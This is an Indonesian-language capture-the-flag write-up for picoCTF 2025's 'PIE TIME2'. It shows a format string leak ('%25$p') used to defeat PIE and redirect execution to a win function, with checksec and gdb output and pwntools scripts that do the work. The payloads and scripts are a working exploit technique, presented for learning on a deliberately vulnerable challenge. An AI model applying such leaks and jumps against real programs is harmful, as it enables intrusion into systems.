# picoCTF2025-PIE TIME2

# overview
<img width="646" height="487" alt="image" src="https://github.com/user-attachments/assets/ac9fc3f7-4503-4b05-b39a-0aa6b057b3b6" />

chall dengan kerentanan format string. kerentanan ini bisa digunakan untuk me leak alamat memory stack dan membypass proteksi PIE nya.


# note
aku disini belajar untuk persiapan kompetisi jadi aku akan mencoba solve chall ini dalam waktu 1 instance dan tanpa mendownload source code dan tanpa **ai**

# analysis & exploit

oke jadi pertama disini aku diberi file binary dan koneksi ke server. aku langsung coba akses dan exploit binarynya secara lokal dulu. langkah langkah yang aku lakukan :

- cek metadata
- cek proteksi
- menjalankan file binary

```
┌──[reno@cybersec]──[~/ctf/pwn/pietime2]
└[]> file vuln ; pwn checksec vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364, for GNU/Linux 3.2.0, not stripped
[*] '/home/reno/ctf/pwn/pietime2/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
┌──[reno@cybersec]──[~/ctf/pwn/pietime2]
└[]> ./vuln
Enter your name:ambatukyah
ambatukyah
 enter the address to jump to, ex => 0x12345: 0xbabecafe
Segfault Occurred, incorrect address.
```

semua proteksi aktif. tapi biasanya tidak perlu repot repot bypass semuanya. selain itu chall ini tidak memberikan leak address secara gratis. karena ada input nama aku coba input dengan format string untuk 
mengecek apakah ini rentan atau tidak. 
```
Enter your name:%p%p
0xa7025700xfbad2288
```
yosh input ini bukannya ngeprint %p malah print isian stack.dengan ini aku bisa leak alamat penting seperti main dan win. sekarang rencanaku adalah mencari target nya. karena apa yang ada didepan mata sudah di analisis.
aku menggunakan gdb untuk mencari apakah ada fungsi menarik .

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010f0  __cxa_finalize@plt
0x0000000000001100  putchar@plt
0x0000000000001110  puts@plt
0x0000000000001120  fclose@plt
0x0000000000001130  __stack_chk_fail@plt
0x0000000000001140  printf@plt
0x0000000000001150  fgetc@plt
0x0000000000001160  fgets@plt
0x0000000000001170  signal@plt
0x0000000000001180  setvbuf@plt
0x0000000000001190  fopen@plt
0x00000000000011a0  __isoc99_scanf@plt
0x00000000000011b0  exit@plt
0x00000000000011c0  _start
0x00000000000011f0  deregister_tm_clones
0x0000000000001220  register_tm_clones
0x0000000000001260  __do_global_dtors_aux
0x00000000000012a0  frame_dummy
0x00000000000012a9  segfault_handler
0x00000000000012c7  call_functions
0x000000000000136a  win
0x0000000000001400  main
0x0000000000001450  __libc_csu_init
0x00000000000014c0  __libc_csu_fini
0x00000000000014c8  _fini
pwndbg>
```
okey fokus , jelas sekali disini ada fungsi win : `0x000000000000136a  win` saat aku analisis ternyata fungsi ini akan melakukan print flag, namun sayangnya fungsi ini tidak dipanggil di main. jadi aku harus memanggilnya
dari layanan jump to yang disediakan author pada program ini. namun biasanya fungsi yang tidak dipanggil tidak ada di stack. aku akan gunakan alamat main untuk mencari base address dan offset fungsi win di servernya.
`0x0000000000001400  main`. 

note PIE : walaupun alamat diacak, 3 digit terakhir tidak diacak. jika melihat fungsi main `400` maka itu lah yang akan jadi target ku nanti.

setelah menemukan alamat penting tersebut aku membuat skrip python untuk melakukan bruteforce ke file binary agar ia meleak seluruh alamatnya dari index 0 hingga 32. (tidak ada alasan khusus kenapa aku pakai range
ini, biar bagus aja sesuai ukuran byte haha.)

```Python
1 from pwn import *
 2
 3 context.log_level = "error"
 4 elf = context.binary = ELF("./vuln")
 5 print(f"target = {hex(elf.sym.main)}")
 6
 7 for i in range(32):
 8     payload = f"%{i}$p"
 9     io = process("./vuln")
10     io.sendlineafter(b"name:",payload.encode())
11     print(f"indx{i} = {io.recvline().decode()}")
12     io.close()
```
by the way, aku mengeditnya menggunakan nano. jadi maaf jika indentasinya agak buruk. karena aku sedang speedrun jadi tidak ada waktu pakai text editor lain.

berikut resultnya :

<img width="352" height="146" alt="image" src="https://github.com/user-attachments/assets/ed059c4e-7418-4865-b36c-20e6a3db329b" />

di index ke 25 terdapat alamat dengan 3 digit terakhir yang mirip dengan fungsi main di gdb. aku melakukan print tepat di index ke 25 dan mencoba memasukkannya ke layanan jump to untuk melakukan fastcheck.

<img width="601" height="155" alt="image" src="https://github.com/user-attachments/assets/da2b7dc5-1ac0-473a-9c23-e25194743764" />

jackpot. alamat tersebut valid dan fungsi main nya lompat ke main itu sendiri. tanpa eror. sekarang saat nya menghitung base address. aku melanjutkan skrip dengan menyimpan data leak address main tadi dan 
menghitungnya.
```Python
 1 from pwn import *
 2
 3 context.log_level = "error"
 4 elf = context.binary = ELF("./vuln")
 5 '''
 6 leaker stack address
 7 for i in range(32):
 8     payload = f"%{i}$p"
 9     io = process("./vuln")
10     io.sendlineafter(b"name:",payload.encode())
11     print(f"indx{i} = {io.recvline().decode()}")
12     io.close()
13 '''
14 payload = f"%25$p"
15
16 io = process("./vuln")
17 io.sendlineafter(b"name:",payload.encode())
18
19 leak_main = io.recvline().decode()
20 elf.address = int(leak_main,16) - elf.sym.main
21 print(hex(elf.sym.win))
22 io.interactive()
23
24
```
result : 
<img width="596" height="154" alt="image" src="https://github.com/user-attachments/assets/719d5fc4-2eae-44bd-983e-0db9da227d1a" />

lihat? 3 digit terakhir dari fungsi win yang aku dapat adalah `36a` dan yang ada di gdb tadi juga `36a` ini valid, dan di foto itu juga sudah jadi buktinya. saat aku mendapat flag ini waktu instance tinggal 50 detik
jadi aku segera kembali ke pico ctf dan mengganti target ku dari process file menjadi remote koneksi ke server untuk mendapatkan flag asli. 

foto di bawah ini adalah instance ke 2, karena write up ini dibuat setelah aku solve. 

<img width="622" height="137" alt="image" src="https://github.com/user-attachments/assets/1d722001-7442-4a2d-93f3-4545443df6cb" />

aku ga tau kenapa aku masang tanda tangan disitu, tapi okelah. solve dalam 14 menit dan 45 detik. ini masih lama banget sih hem. at least no source code, no ai. 

flag : **picoCTF{...........OMagA_REdacTed..........}**
